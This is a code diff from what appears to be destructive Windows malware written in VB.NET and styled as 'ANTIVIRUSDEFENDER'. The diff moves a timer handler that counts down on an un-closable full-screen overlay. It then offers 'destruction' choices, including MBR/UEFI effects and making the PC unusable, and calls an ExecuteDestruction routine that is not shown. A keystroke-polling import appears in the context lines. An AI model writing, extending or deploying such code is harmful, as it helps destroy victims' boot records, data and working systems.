@@ -184,43 +184,6 @@ Public Class Form1
         Invalidate() ' Clear the flash effect
     End Sub
 
-    Private Sub AnimationTimer_Tick(sender As Object, e As EventArgs) Handles AnimationTimer.Tick
-        ' Timer tick function, applies effects and updates countdown timer
-        Try
-            overlay = New FullScreenOverlay()
-            Dim g As Graphics = CreateGraphics()
-            g.SmoothingMode = SmoothingMode.None
-
-            ' Draw portal effect first
-            overlay.ApplyPortalEffect(g)
-
-            ' Update the countdown timer label
-            If overlay.countdownTime > 0 Then
-                overlay.countdownTime -= 1
-                overlay.timerLabel.Text = "Remaining Time: " & overlay.countdownTime.ToString() & " seconds"
-            Else
-                ' When countdown finishes, prompt user for destruction option
-                Dim options As String() = {
-                "Maximum Destruction",
-                "Classic MBR/UEFI Effects",
-                "Surprise Me",
-                "Just Make Unusable My PC Without Destruction"
-            }
-
-                Dim choice As String = overlay.PromptUserForChoice("Select a destruction option:", options)
-
-                If Not String.IsNullOrEmpty(choice) Then
-                    overlay.timerLabel.Text = "Time's up! ANTIVIRUSDEFENDER IS EVERYWHERE!"
-                    Thread.Sleep(5000) ' Optional: Adjust as needed
-                    overlay.ExecuteDestruction(choice)
-                End If
-            End If
-
-        Catch ex As Exception
-            MessageBox.Show("An error occurred during animation: " & ex.Message, "Animation Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-        End Try
-    End Sub
-
     Public Class FullScreenOverlay
         Inherits Form
 
@@ -520,6 +483,43 @@ Public Class Form1
             e.Cancel = True
         End Sub
     End Class
+
+    Private Sub AnimationTimer_Tick(sender As Object, e As EventArgs) Handles AnimationTimer.Tick
+        ' Timer tick function, applies effects and updates countdown timer
+        Try
+            overlay = New FullScreenOverlay()
+            Dim g As Graphics = CreateGraphics()
+            g.SmoothingMode = SmoothingMode.None
+
+            ' Draw portal effect first
+            overlay.ApplyPortalEffect(g)
+
+            ' Update the countdown timer label
+            If overlay.countdownTime > 0 Then
+                overlay.countdownTime -= 1
+                overlay.timerLabel.Text = "Remaining Time: " & overlay.countdownTime.ToString() & " seconds"
+            Else
+                ' When countdown finishes, prompt user for destruction option
+                Dim options As String() = {
+                "Maximum Destruction",
+                "Classic MBR/UEFI Effects",
+                "Surprise Me",
+                "Just Make Unusable My PC Without Destruction"
+            }
+
+                Dim choice As String = overlay.PromptUserForChoice("Select a destruction option:", options)
+
+                If Not String.IsNullOrEmpty(choice) Then
+                    overlay.timerLabel.Text = "Time's up! ANTIVIRUSDEFENDER IS EVERYWHERE!"
+                    Thread.Sleep(5000) ' Optional: Adjust as needed
+                    overlay.ExecuteDestruction(choice)
+                End If
+            End If
+
+        Catch ex As Exception
+            MessageBox.Show("An error occurred during animation: " & ex.Message, "Animation Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+        End Try
+    End Sub
 
     ' Declare the GetAsyncKeyState function
     <DllImport("user32.dll")>
